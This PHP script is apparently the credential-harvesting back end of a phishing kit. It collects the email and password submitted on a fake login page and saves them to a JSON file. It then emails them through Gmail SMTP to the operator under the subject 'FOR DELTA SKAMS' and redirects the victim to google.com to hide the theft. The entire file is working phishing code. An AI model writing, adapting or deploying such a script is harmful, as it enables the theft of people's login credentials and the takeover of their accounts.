<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';
require 'local.php';
require $page;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    $email    = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
    $parts = explode('/', $page);
    $result = $parts[count($parts) - 2]; 
    $user_data = array(
    'email' => $email,
    'password' => $password,
    'page' => $result
    );

    $json_user_data = json_encode($user_data, JSON_PRETTY_PRINT);
    $file_path_user = 'user_data.json';
    if (file_put_contents($file_path_user, $json_user_data) !== false) {
        echo "hhhhhhhhhhhh";
    }
   

    $mail = new PHPMailer(true);

    try {
        
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = $admin_email; 
        $mail->Password   = $admin_password;         
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port       = 587;

       
        $mail->setFrom($admin_email, 'Delta Email ');
        $mail->addAddress($admin_email); 
        $mail->addReplyTo($email);

        
        $mail->isHTML(true);
        $mail->Subject = 'FOR DELTA SKAMS ';
        $mail->Body    = "
            <b>this a page information :<b> <br><br>
            <b>page is : <b> $result<br>
            <b>Emal is : </b> $email<br>
            <b>Password : </b> $password <br>
            
           
        ";

        $mail->send();
        echo '<meta http-equiv="refresh" content="0;url=https://google.com">';
    } catch (Exception $e) {
        echo "Error  {$mail->ErrorInfo}";
    }
}
?>
